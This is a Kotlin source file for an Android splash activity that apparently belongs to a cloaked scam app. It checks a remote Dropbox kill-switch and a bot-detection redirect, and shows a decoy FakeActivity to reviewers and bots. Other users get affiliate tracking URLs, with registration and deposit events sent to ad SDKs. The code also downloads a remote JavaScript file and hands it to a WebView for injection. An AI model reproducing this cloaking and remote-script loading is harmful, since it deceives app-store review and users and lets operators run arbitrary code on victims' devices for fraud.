package com.naebalovo.tochno.multiapp20

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkRequest
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.ViewGroup
import android.webkit.WebSettings
import android.widget.ProgressBar
import android.widget.RelativeLayout
import bolts.AppLinks
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.AppsFlyerLibCore
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.google.android.material.progressindicator.ProgressIndicator
import com.onesignal.BuildConfig
import com.onesignal.OSNotification
import com.onesignal.OneSignal
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import org.json.JSONException
import org.json.JSONObject
import java.lang.Runnable
import java.util.*

private const val TAG = "MainActivity"

class SplashActivity : AppCompatActivity(),OneSignal.NotificationReceivedHandler{
    private lateinit var progressIndicator: ProgressIndicator
    private lateinit var preferences: SharedPreferences
    private lateinit var httpClient: OkHttpClient
    private lateinit var dialog: AlertDialog

    private val backDeque: Deque<String> = LinkedList()
    private var script : String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val conversionTask = object : Runnable {
        override fun run() {
            GlobalScope.launch {
                val json = getConversion()
                val eventName = "event"
                val valueName = "value"
                if (json.has(eventName)) {
                    val value =
                        json.optString(valueName) ?: " " // при пустом value отправляем пробел
                    sendOnesignalEvent(json.optString(eventName), value)
                    sendFacebookEvent(json.optString(eventName), value)
                    sendAppsflyerEvent(json.optString(eventName), value)
                }
            }
            handler.postDelayed(this, 15000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)


        progressIndicator = ProgressIndicator(this)
        progressIndicator.indicatorType = ProgressIndicator.LINEAR
        progressIndicator.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
        progressIndicator.isIndeterminate = true
        progressIndicator.trackColor = resources.getColor(R.color.colorSplash)
        progressIndicator.setBackgroundColor(resources.getColor(android.R.color.transparent))
        setProgressIndicatorLayout(R.id.loading_indicator)
        progressIndicator.show()

        /*GlobalScope.launch(Dispatchers.Main) {
            val analyticsJs =
                "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //DEBUG!!!
            val scriptTask =
                async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }

            script = scriptTask.await()
        }*/

        val queue = Volley.newRequestQueue(this@SplashActivity)

        val stringRequest = StringRequest(
            Request.Method.GET,
            "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0",
            { response ->
                if (response.toString() != "true") {
                    progressIndicator.hide()
//                    progressBar.visibility = ProgressBar.GONE
                    Log.d(TAG,"YASOSAL")
                    progressIndicator.hide()
                    startActivity(Intent(this@SplashActivity, FakeActivity::class.java))
                    finish()
                    return@StringRequest

                }
            },
            {
                progressIndicator.hide()

//                progressBar.visibility = ProgressBar.GONE
                startActivity(Intent(this@SplashActivity, FakeActivity::class.java))
                finish()
                return@StringRequest})
        val stringRequest2 = StringRequest(
            com.android.volley.Request.Method.GET,
            "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js",
            { response ->

                script = response.toString()
                Log.d("TAGTAGTAG", response.toString())
            },
            {
                startActivity(Intent(this@SplashActivity, FakeActivity::class.java))
                finish()
                return@StringRequest})

        queue.add(stringRequest)
        queue.add(stringRequest2)

        FacebookSdk.setApplicationId("293366948652919")

        initOkhttpClient()
        initSDK()
        dialog = AlertDialog.Builder(this).apply {
            setTitle("No Internet Connection")
            setMessage("Turn on the the network")
            setCancelable(false)
            setFinishOnTouchOutside(false)
        }.create()

        if (isConnectedToNetwork()) {
            mainInit()
        } else {
            val firstDialog = AlertDialog.Builder(this).apply {
                setTitle("No Internet Connection")
                setMessage("Turn on the the network and try again")
                setPositiveButton("Try Again", null)
                setCancelable(false)
                setFinishOnTouchOutside(false)
            }.create()
            firstDialog.show()
            firstDialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                if (isConnectedToNetwork()) {
                    firstDialog.dismiss()
                    mainInit()
                }
            }
        }
        registerNetworkCallback()
    }

    fun setProgressIndicatorLayout(layoutId: Int) {
        val layout = findViewById<RelativeLayout>(layoutId)
        layout.addView(progressIndicator)
        progressIndicator.hide()
    }

//Check Network-------------------------------------------------------------------------------------


    private fun mainInit(){
        preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
        val strDeque = preferences.getString("PREFS_DEQUE", null)
        strDeque?.let {
            for (elem in strDeque.split(",")) {
                addToDeque(elem)
            }
        }
        val deque: Deque<String> = LinkedList()
        Log.d(TAG, deque.isNotEmpty().toString() + "(*-*)")
//        if (backDeque.isNotEmpty() ) {
//            progressIndicator.hide()
//            val i = Intent(this@SplashActivity, MainActivity::class.java)
//            i.putExtra("URL",backDeque.first)
//            i.putExtra("script",script)
//            startActivity(i)
//            backDeque.removeFirst()
//        } else {
            Log.d(TAG, "NOTHING")
            preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)

            val deeplink = preferences.getString("PREFS_DEEPLINK", null)

            if (deeplink == null) {
                Log.d(TAG, "deeplink = null")
                getDeeplinkFromFacebook()
            } else {
                Log.d(TAG, "deeplink != null")
                processDeeplinkAndStart(deeplink)
//            }
        }
    }
    private fun isConnectedToNetwork(): Boolean{
        val conn = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        return conn?.activeNetworkInfo?.isConnected ?: true
    }
    private fun registerNetworkCallback(){
        try {
            val connectivityManager =
                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val builder = NetworkRequest.Builder()

            connectivityManager.registerNetworkCallback(builder.build(), object :
                ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    dialog.hide()
                }

                override fun onLost(network: Network) {
                    super.onLost(network)
                    dialog.show()
                }
            })
        } catch (ex: java.lang.Exception) {
            ex.printStackTrace()
        }
    }


//OK-Cock HTTP REQUEST------------------------------------------------------------------------------


    private fun initOkhttpClient()                                                             {
        httpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()

    }
    private fun isBot(): Boolean                                                               {
        try {
            val response = httpClient
                .newCall(okhttp3.Request.Builder().url("http://78.47.187.129/Z4ZvXH31").build())
                .execute()
            val redirectLocation = response.header("Location")

            redirectLocation?.let { return Uri.parse(it).host == "bot" } ?: return true
        } catch (ex: Exception) {
            return true
        }
    }
    
    
//Huevents SDicK------------------------------------------------------------------------------------


    private fun getConversion(): JSONObject                                                    {
        val conversionUrl = "https://freerun.site/conversion.php"
        return try {
            val response = httpClient
                .newCall(okhttp3.Request.Builder().url("$conversionUrl?click_id=${getClickId()}").build())
                .execute()
            JSONObject(response.body()?.string() ?: "{}")
        } catch (ex: Exception) {
            JSONObject("{}")
        }
    }
    private fun sendOnesignalEvent(key: String, value: String)                                 {
        OneSignal.sendTag(key, value)
    }
    private fun sendFacebookEvent(key: String, value: String)                                  {
        val fb = AppEventsLogger.newLogger(this)

        val bundle = Bundle()
        when (key) {
            "reg" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_COMPLETED_REGISTRATION, bundle)
            }
            "dep" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                fb.logEvent(AppEventsConstants.EVENT_NAME_ADDED_TO_CART, bundle)
            }
        }
    }
    private fun sendAppsflyerEvent(key: String, value: String)                                 {
        val values = HashMap<String, Any>()
        values[key] = value
        AppsFlyerLib.getInstance().trackEvent(this, key, values)
    }
    private fun initSDK()                                                                      {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        OneSignal.startInit(this)
            .setNotificationReceivedHandler(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()

        val devKey = "qrdZGj123456789";
        val conversionDataListener  = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                data?.let { cvData ->
                    cvData.map {
                        Log.i(AppsFlyerLibCore.LOG_TAG, "conversion_attribute:  ${it.key} = ${it.value}")
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e(AppsFlyerLibCore.LOG_TAG, "error onAttributionFailure :  $error")
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                data?.map {
                    Log.d(AppsFlyerLibCore.LOG_TAG, "onAppOpen_attribute: ${it.key} = ${it.value}")
                }
            }

            override fun onAttributionFailure(error: String?) {
                Log.e(AppsFlyerLibCore.LOG_TAG, "error onAttributionFailure :  $error")
            }
        }

        AppsFlyerLib.getInstance().init(devKey, conversionDataListener, this)
        AppsFlyerLib.getInstance().startTracking(this)
    }
    override fun notificationReceived(notification: OSNotification)                            {
        val keys = notification.payload.additionalData.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            try {
                OneSignal.sendTag(key, notification.payload.additionalData.get(key).toString())
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
    }


//DeepSuction---------------------------------------------------------------------------------------


    private fun getDeeplinkFromFacebook()                                                      {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
            val uri: Uri? = appLinkData?.targetUri ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)

            if (uri != null && uri.query != null) {
                processDeeplinkAndStart(uri.query!!)
                preferences.edit().putString("PREFS_DEEPLINK", uri.query!!).apply()
            } else {
                processDeeplinkAndStart("")
            }

        }
    }
    private fun processDeeplinkAndStart(deeplink: String)                                      {

        val trackingUrl = "https://wokeup.site/click.php?key=ZvjJ12Wr2oTlGNLQyhV9"

        val clickId = getClickId()
        val sourceId = BuildConfig.APPLICATION_ID
        var finalUrl = "$trackingUrl&source=$sourceId&click_id=$clickId"

        if (!deeplink.isBlank()) {
            finalUrl = "$finalUrl&$deeplink"
        }

        GlobalScope.launch(Dispatchers.Main) {

//            val analyticsJs = "https://dl.dropboxusercontent.com/s/lmibwymtkebspij/background.js" //NOT CORRECTED!!
//            val scriptTask = async(Dispatchers.IO) { java.net.URL(analyticsJs).readText(Charsets.UTF_8) }
//            script = scriptTask.await()



            val isBot = withContext(Dispatchers.IO) { isBot() }
            Log.d(TAG + "1",isBot.toString())
            Log.d(TAG, "IS_BOT$isBot")

            if (backDeque.isNotEmpty() && backDeque.first != "") {
//                progressBar.visibility = ProgressBar.GONE
                progressIndicator.hide()
                val i = Intent(this@SplashActivity, MainActivity::class.java)
                i.putExtra("URL",backDeque.first)
                i.putExtra("script",script)
                startActivity(i)
                backDeque.removeFirst()
                finish()
            } else {
                handler.post(conversionTask)

                OneSignal.sendTag("nobot", "1")
                OneSignal.sendTag("bundle", BuildConfig.APPLICATION_ID)

                val streamId = Uri.parse("?$deeplink").getQueryParameter("stream")

                if (!streamId.isNullOrBlank()) {
                    OneSignal.sendTag("stream", streamId)
                }
                val i = Intent(this@SplashActivity, MainActivity::class.java)
                i.putExtra("URL",finalUrl);
                i.putExtra("script",script);
                startActivity(i)
            }
        }
    }
    private fun getClickId(): String                                                           {
        var clickId = preferences.getString("PREFS_CLICK_ID", null)
        if (clickId == null) {
            // в случае если в хранилище нет click_id, генерируем новый
            clickId = UUID.randomUUID().toString()
            preferences.edit().putString("PREFS_CLICK_ID", clickId)
                .apply() // и сохраняем в хранилище
        }
        return clickId
    }


//Memorizing five last urls-------------------------------------------------------------------------


    override fun onStop()                                                                      {
        super.onStop()
        preferences.edit().putString("PREFS_DEQUE", backDeque.reversed().joinToString(",")).apply()
    }
    private fun addToDeque(url: String)                                                        {
        if (backDeque.size > 5) {
            backDeque.removeLast()
        }
        backDeque.addFirst(url)
    }
    private fun goBackWithDeque(): Boolean                                                     {
        try {
            if (backDeque.size == 1) return false;


            backDeque.removeFirst()
            webView?.loadUrl(backDeque.first)


            backDeque.removeFirst()
            return true

        } catch (ex: NoSuchElementException) {
            ex.printStackTrace()
            return false
        }
    }
}